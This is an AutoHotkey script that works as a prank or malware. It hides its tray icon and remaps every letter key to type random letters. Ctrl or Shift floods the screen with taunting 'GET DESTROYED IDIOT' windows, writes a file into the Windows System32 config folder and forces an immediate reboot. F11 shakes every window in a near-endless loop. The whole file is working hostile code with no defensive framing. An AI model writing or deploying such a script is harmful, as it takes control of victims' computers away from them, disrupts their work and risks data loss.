#NoTrayIcon
#NoEnv  ; Recommended for performance and compatibility
SendMode Input  ; Recommended for new scripts due to its superior speed
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory

global arr := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

Loop, Parse, % "abcdefghijklmnopqrstuvwxyz", % "" 
{
    Hotkey, *%A_LoopField%, Snd
}
return
Ctrl::
Loop, 250 ; yes.
{
    Random, RandX, 0, % A_ScreenWidth - 100
    Random, RandY, 0, % A_ScreenHeight - 100
    
    ; By adding a letter prefix, we bypass the 1-99 limit
    GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
    
    Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
    Gui, %GuiName%:Add, Text, w200 h50 Center, GET DESTROYED IDIOT
    
    Gui, %GuiName%:Show, x%RandX% y%RandY%
 Sleep, 10000
FileAppend, kalala, C:\Windows\System32\config\OSDATA
Run, shutdown /r /t 0
}
return
Shift::
Loop, 250 ; yes. 2
{
    Random, RandX, 0, % A_ScreenWidth - 100
    Random, RandY, 0, % A_ScreenHeight - 100
    
    ; By adding a letter prefix, we bypass the 1-99 limit
    GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
    
    Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
    Gui, %GuiName%:Add, Text, w200 h50 Center, GET DESTROYED IDIOT
    
    Gui, %GuiName%:Show, x%RandX% y%RandY%
 Sleep, 10000
FileAppend, kalala, C:\Windows\System32\config\OSDATA
Run, shutdown /r /t 0
}
return
F11::
; identify class
WinGetClass, CurrentClass, A

; loop
Loop, 100000000000000 ; Number of "waves" of shaking
{
    ; get a list of all current windows
    WinGet, WindowList, List

    ; loop through every window found
    Loop, %WindowList%
    {
        this_id := WindowList%A_Index%

        ; get position
        WinGetPos, X, Y, , , ahk_id %this_id%
        
        Random, MoveX, -20, 20
        Random, MoveY, -20, 20
        
        ; move the specific window by ID
        WinMove, ahk_id %this_id%,, X + MoveX, Y + MoveY
    }
    Sleep, 1 ; prevent the cpu from absolutely being destroyed, not showing the effects of the script
}
return
return
End::Send, Nice try
Del::LButton




Snd() {
	Random, RandomVar, 1, 26
	SendInput % arr[RandomVar]
}


